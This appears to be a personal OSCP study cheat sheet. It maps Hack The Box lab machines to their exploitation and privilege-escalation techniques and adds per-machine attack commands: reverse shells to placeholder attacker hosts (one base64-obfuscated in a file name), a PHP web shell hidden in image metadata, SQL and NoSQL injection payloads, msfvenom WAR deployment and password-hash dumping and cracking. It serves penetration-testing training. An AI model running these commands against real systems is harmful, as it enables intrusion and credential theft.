### AD Machines

Forest, Active, Monteverde, Reel, Mantis, Blackfield, Search, APT

https://twitter.com/hackthebox_eu/status/1529122562038456320?cxt=HHwWgICzhcu3xLgqAAAA

### Linux Machines

| Machine | Enumeration | Privilege Escalation |
| ------------- | ------------- | ------------- |
| Admirer | Adminer MySQL(local) | Hijacking Python Library | 
| Armageddon | Drupal (2018-7600) | binary snap |
| Backdoor | wordpress LFI proc gdbserver | screen |
| Blocky | dirb javadecompilers wordpress | sudo list |
| Blunder | feroxbuster extensions ```txt``` bludit | sudo versions before 1.8.28 |
| Brainfuck | wordpress plugin smtp pop3 | Cryptography |
| Cronos | subdomain wfuzz| crontab |
| Doctor | [ssti-payloads](https://github.com/payloadbox/ssti-payloads) | Splunk |
| Forge | SSRF subdomain ftp | sudo list Python Debugger pdb |
| Forlic | playsms Ook! | BOF |
| Haircut | dirb medium.txt writeable uploads folder | Unknown SUID binary screen |
| Horizontall | wfuzz top1million-110000 strapi | active port 8000 ```local CVE``` ssh tunnel |
| Irked | irc-unrealircd-backdoor | LinPEAS Unknown SUID binary |
| *Jarvis | SQLi phpmyadmin 4.8 RCE | python command injection & systemctl binary |
| Knife | firefox wappalyzer [PHP 8.1.0](https://github.com/flast101/php-8.1.0-dev-backdoor-rce/blob/main/backdoor_php_8.1.0-dev.py)| upgrade shell & sudo list |
| Lame | distccd | nmap |
| *Luanne | nmap Supervisor & robots.txt weather | BSD doas & netpgp backup file |
| Magic | [SQLi](https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/) bypassing login & <br> File upload bypass [PHP getimagesize()](https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/web-application/file-upload-bypass) | mysqldump & Unknown SUID binary sysinfo |
| *Mango |  certificate subdomains & <br> [enumerate](https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration) credentials of nosql-injection <br> (*Not sure if you can use this script in the exam), reuse | jjs, write root SSH public key | 
| Mirai | nmap, pi.hole, ssh | sudo list, mount, strings |
| Networked | File upload bypass [PHP getimagesize()](https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/web-application/file-upload-bypass), <br> php command injection | *sudo list |
| Nibbles | page source, directory | sudo list |
| *NineVeh | brute force attack http & https, phpLiteAdmin | crontab, chkrootkit |
| OpenAdmin | OpenNetAdmin, pwd in conf file & <br> reverse proxy, cracking passphrase | sudo list, GTFO |
| *Ophiuchi | [Java-Deserialization](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet), SnakeYAML | sudo list, analysis of GO code |
| Passage | CutePHP & password storage location & <br> base64 & cracking | *SUID dbus |
| *Pit | SNMP enum, hide web folder, SeedDMS | NET-SNMP-EXTEND-MIB, monitoring |
| *Poison | LFI, FreeBSD Apache log poisoning | password base64, vncviewer |
| Popcorn | torrent, upload bypass | user cache, motd, Linux PAM | 
| Postman | Redis, ssh, john | [Webmin](https://github.com/KrE80r/webmin_cve-2019-12840_poc) |
| Previse | HTTP [302](https://vk9-sec.com/bypass-30x-redirect-with-burpsuite/), PHP exec, mysql, hashcat 500 | sudo list, [$PATH variable](https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/) |
| Ready | [gitlab](https://github.com/dotPY-hax/gitlab_RCE) | *[Escaping Docker](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#mounting-disk-poc2) (mounting-disk-poc2), SSH |
| ScriptKiddie | *[APK](https://www.exploit-db.com/exploits/49491)(No need for msfvenom but be careful choosing payload), <br>shell script, command injection (cut) | sudo list |
| Seal | manager, *403 Fuzz, 401, credential in commit history, <br> opt, symbolic link, ssh | sudo list |
| Sense | feroxbuster extensions ```txt``` medium.txt, pfsense RCE | no need |
| Shibboleth | wfuzz, udp, IPMI, hashcat 7300, <br> zabbix RCE, password reuse | [MariaDB](https://www.exploit-db.com/exploits/49765) |
| Shocker | [ShellShock](https://nvd.nist.gov/vuln/detail/cve-2014-6271), ```403``` permission directory, extensions ```sh``` ```pl``` | sudo list |
| SneakyMailer | subdomain(wfuzz), *credential phishing(email, nc), ftp, <br> *PyPI malicious package | sudo list |
| SolidState | Apache James 2.3.2, *reset user password, POP3, <br> trigger by ssh login | task, file permission |
| Sunday | finger enum [users](https://github.com/danielmiessler/SecLists/blob/master/Usernames/Names/names.txt), SSH, backup folder, hashcat 7400 | sudo list (wget) |
| SwagShop | Magento CVE-2015-1397 | sudo list (vi) |
| Tabby | LFI, tomcat-users.xml, page source, remote deploy, <br> file password | [lxd](https://hacktricks.boitatech.com.br/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation) |
| TartarSauce | web dir enum, wordpress plugins, <br> CVE-2015-8351 (plugin real version), sudo list (tar) | *backuperer.service (System timers) |
| Time | *Jackson (CVE-2019-12384), Java-Deserialization | timer_backup.service (System timers) |
| Traverxec | Nostromo, [HOMEDIRS](https://www.gsp.com/cgi-bin/man.cgi?section=8&topic=nhttpd#HOMEDIRS) (www_public), hidden folder in user's folder, <br> cracking passphrase (e.g., OpenAdmin box)  | ```/etc/sudoers```, journalctl without PIPE, <br> resize (e.g., less, vi) |
| Valentine | web dir enum, Heartbleed [poc](https://github.com/sensepost/heartbleed-poc), decrypt RSA private key | tmux |

(*):review before the exam

### Windows Machines

| Machine | Enumeration | Privilege Escalation | AD |
| ------------- | ------------- | ------------- | :-----------: |
| Active ||| :white_check_mark: |
| *APT | MS-RPC port 135, [IOXID resolver](https://github.com/mubix/IOXIDResolver), IPv6, share file, AD database file, <br> [dump hashes](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py), valid usernames, [modify registry](https://github.com/SecureAuthCorp/impacket/blob/master/examples/reg.py) | [responder](https://github.com/SpiderLabs/Responder), NTLMv1 Hash | :white_check_mark: |
| Arctic | Adobe ColdFusion 8 | MS10-059(wait for the exploit to take effect) ||
| *Bankrobber | XSS, SQLi, Arbitrary File Read | [forwarding service](https://github.com/jpillora/chisel), BOF ||
| Bastard | Drupal 7 CVE-2018-7600 | MS10-059, MS15-051 ||
| Bastion | mount vhd, SYSTEM SAM user hash | mRemoteNG || 
| Blue | MS17-010 | no need ||
| Bounty | File upload bypass, [web.config](https://github.com/tedchen0001/OSCP-Notes/blob/master/Windows/File_Upload_Bypass.md) | [SeImpersonatePrivilege](https://github.com/tedchen0001/OSCP-Notes/blob/master/Windows/Privilege/SeImpersonatePrivilege.md) ||
| Buff ||||
| Chatterbox | Achat | AutoLogon credentials, reuse password, powershell reverse (with credential) ||
| Conceal | SNMP, *IPsec VPN, FTP (IIS folder), Classic ASP | [SeImpersonatePrivilege](https://github.com/tedchen0001/OSCP-Notes/blob/master/Windows/Privilege/SeImpersonatePrivilege.md) ||
| Fuse | username(from website), create password(cewl --with-numbers), smbpasswd, enumprinters(rpcclient) | [SeLoadDriverPrivilege](https://github.com/tedchen0001/OSCP-Notes/blob/master/Windows/Privilege/SeLoadDriverPrivilege.md), zerologon | :white_check_mark: |
| Grandpa | Windows Server 2003, IIS WebDAV CVE-2017-7269 | WMI Service Isolation Privilege Escalation (churrasco) ||
| Granny | Windows Server 2003, IIS WebDAV CVE-2017-7269 | WMI Service Isolation Privilege Escalation (churrasco) ||
| *Intelligence | username(pdf creator), add AD Integrated DNS records  | group ReadGMSAPassword | :white_check_mark: |

(*):review before the exam

### Additional command notes

Used in ```Knife``` for upgrade shell

```
/bin/bash -c '/bin/bash -i >& /dev/tcp/<attacker ip>/<attacker port> 0>&1'
```

Used in ```Luanne``` 

authenticate

```
curl -s http://127.0.0.1:3001/<folder>/ -u <user>:<password>
```

find the open ports

```
netstat -punta || ss -nltpu || netstat -anv
```

Used in ```Magic``` 

image file upload bypass

```
exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' file.jpg
```

dump mysql database data without using mysql client tool

```
mysqldump -u root -p database_name > database_name.sql
```

Used in ```Mango```

[nosql-injection](https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/nosql-injection.md): basic authentication bypass

```
# change post data
username[$ne]=toto&password[$ne]=toto
username[$regex]=.*&password[$regex]=.*
username[$exists]=true&password[$exists]=true
```

Used in ```Mirai```

```
# check partition
strings /dev/sdb
```

Used in ```Networked```

command injection

```
# method1: vaild file name
echo "" > "; nc -c bash 192.168.0.1 4444 ;"
# method2: use base64 encoding format to avoid file name checking
echo nc -e /bin/bash 192.168.0.1 4444 | base64 -w0
echo "" > "a; echo bmMgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguMC4xIDQ0NDQK | base64 -d | sh; b"
```

[base64](https://linux.die.net/man/1/base64)

```
-w, --wrap=COLS
    Wrap encoded lines after COLS character (default 76). Use 0 to disable line wrapping.
-d, --decode
    Decode data.
-i, --ignore-garbage
    When decoding, ignore non-alphabet characters.
--help
    display this help and exit
--version
    output version information and exit
```

Used in ```Nineveh```

```
# check information in image file
strings -n 20 <image file> 
# extract known file types 
binwalk <image file>
binwalk -e <image file>
```

Used in ```OpenAdmin```

find files containing specific text e.g. password

```
find / -type f \( -iname \*.php -o -iname \*.config -o -iname \*.conf -o -iname \*.ini -o -iname \*.txt \) -exec grep -i 'password\|passwd' {} \; -print 2>&-
```

crack SSH private key passphrase

```
ssh2john id_rsa > id_rsa.hash
john id_rsa.hash -wordlist=rockyou.txt
```

Used in ```Ophiuchi```

one line reverse shell command in Java

```Java
String[] cmdline = { "sh", "-c", "echo 'bash -i >& /dev/tcp/<attacker ip>/<attacker port> 0>&1' > /tmp/revshell.sh && chmod 777 /tmp/revshell.sh && bash /tmp/revshell.sh" }; 
Runtime.getRuntime().exec(cmdline);
```

Used in ```Pit```

```
# crack SNMP passwords
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt -p <target port> <target ip>
```

```
snmpwalk -v1 -c public <target ip> .
# -v 1|2c|3 SNMP version
# -c community string, like a password
# . [OID]
```
get file access control lists

```
getfacl /usr/local/monitoring
```

Used in ```Tabby```

```shell
# create reverse shell
msfvenom -p java/shell_reverse_tcp lhost=<attacker ip> lport=<attacker port> -f war -o shell.war
# Tomcat role admin, manager and manager-script can remote deploy 
curl -v -u 'tomcat:<password>' --upload-file shell.war "http://<target ip>:<port>/manager/text/deploy?path=/test&update=true"
# trigger
curl http://<target ip>:<port>/test/
# crack zip file password
zip2john <file> > hash
john --wordlist=<password_list> hash       
```

Used in ```TartarSauce```

```shell
wpscan --url http://<target ip>/ -e ap --plugins-detection aggressive --api-token <api_key> -t 20 --verbose
# --api-token:display vulnerability data (not always necessary), register a uesr and get the api key from wpscan offical website
```

Used in ```Time```

```shell
# privilege escalation by using task script 
echo 'cp /bin/sh /tmp/sh;chmod u+s /tmp/sh' > <task script file>
# execute
/tmp/sh -p
# -p priviliged
```

Used in ```Valentine```

```shell
# check heartbleed vulnerability with Nmap NSE script
nmap --script=ssl-heartbleed -p <target port> <target ip>
```

```ssh-rsa``` turned off by default

```shell
# sign_and_send_pubkey: no mutual signature supported
ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa <user>@<target ip> -i <private_key>
```

```shell
# hijacking tmux sessions for Privilege Escalation 
/usr/bin/tmux -S /.devs/dev_sess
```

Used in ```APT```

port 135 MSRPC

[rpcdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/rpcdump.py)

[Windows DCOM version 5.6](https://airbus-cyber-security.com/the-oxid-resolver-part-1-remote-enumeration-of-network-interfaces-without-any-authentication/)

```shell
# mappings of RPC
python3 rpcdump.py <target ip> -p 135
# enumerating network interface, Windows DCOM version 5.6
python3 IOXIDResolver.py <target ip>
# Nmap IPv6 scan
nmap -6 -p- --min-rate 1000 <target IPv6 address>
# enumerating information from Samba systems
python3 enum4linux-ng.py -A -C <target IPv6 address>
# list all files from all readable shares
crackmapexec smb <target IPv6 address> -u '' -p '' -M spider_plus
```

Used in ```Bankrobber```

```sql
/* load file */
x' UNION SELECT 1, LOAD_FILE('C:\Windows\System32\drivers\etc\hosts'),3-- - 
```

[TCP/UDP tunnel over HTTP](https://github.com/jpillora/chisel)


Used in ```Bastion```

```shell
sudo mkdir /mnt/bastion
sudo mount -t cifs -o username=NULL //<target ip>/Backups/WindowsImageBackup  /mnt/bastion -o rw
mkdir /tmp/vhd
guestmount --add "/mnt/bastion/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd" --inspector --ro /tmp/vhd -v
cd /tmp/vhd/Windows/System32/config/
# using two file SYSTEM and SAM to dump the hashes
samdump2 SYSTEM SAM > /tmp/hashes.txt
# crack user password hash
hashcat -m 1000 user_hash.txt <password_list.txt>
```

Used in ```Chatterbox```

```cmd
REM create payload
msfvenom -p windows/shell_reverse_tcp lhost=<attacker ip> lport=<attacker listening port> -f exe > rev.exe
REM change user, password and payload
powershell -c "$password = ConvertTo-SecureString '<password>' -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential('<user>', $password);Start-Process -FilePath "<payload>" -Credential $creds"
```

Used in ```Conceal```

```
sudo ipsec restart
```

[SeImpersonatePrivilege](https://github.com/tedchen0001/OSCP-Notes/blob/master/Windows/Privilege/SeImpersonatePrivilege.md)

Used in ```Grandpa```

```
churrasco.exe "nc.exe -e cmd.exe <attacker ip> <attacker port>"
```